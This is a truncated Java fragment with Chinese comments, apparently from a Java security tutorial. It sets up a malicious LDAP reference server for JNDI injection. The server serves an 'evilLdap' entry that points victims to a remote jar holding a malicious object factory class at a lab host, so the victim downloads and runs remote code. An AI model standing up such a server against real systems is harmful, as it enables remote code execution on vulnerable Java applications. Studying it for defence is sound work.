...
public class LDAPReferenceServer {
    ...
    // 设置一个实体名称
    public static final String LDAP_ENTRY_NAME = "evilLdap";
    // 获取LDAP服务地址
    public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;
    // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
    public static final String REMOTE_REFERENCE_JAR = "http://javasec.local.me/ReferenceObjectFactory.jar";
    // 设置LDAP基底DN
    private static final String LDAP_BASE = "dc=local,dc=me";
    ...
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        ...
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            ...
            try {
                // 设置对象的工厂类名
                String className = "cc.saferoad.jndi.ReferenceObjectFactory";
